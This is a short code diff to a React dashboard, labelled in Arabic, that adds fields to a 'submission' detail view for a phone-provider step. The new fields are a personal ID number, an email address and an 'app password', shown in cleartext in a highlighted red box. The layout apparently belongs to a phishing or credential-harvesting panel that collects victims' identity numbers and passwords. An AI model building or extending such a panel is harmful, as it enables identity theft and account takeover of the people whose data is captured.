@@ -738,6 +738,16 @@ export default function FirebaseDashboard() {
                   <div className="grid grid-cols-2 gap-4">
                     <DetailItem label="مزود الخدمة" value={selectedSubmission.step_6_phone_provider.provider} />
                     <DetailItem label="رقم الهاتف" value={selectedSubmission.step_6_phone_provider.phoneNumber} icon={Phone} />
+                    <DetailItem label="الرقم الشخصي" value={selectedSubmission.step_6_phone_provider.personalId} icon={User} />
+                    <DetailItem label="البريد الإلكتروني" value={selectedSubmission.step_6_phone_provider.email} icon={Mail} />
+                  </div>
+                  <div className="mt-4 pt-4 border-t border-gray-700">
+                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
+                      <p className="text-xs text-red-400">كلمة مرور التطبيق</p>
+                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
+                        {selectedSubmission.step_6_phone_provider.password || "-"}
+                      </p>
+                    </div>
                   </div>
                 </DetailSection>
               )}
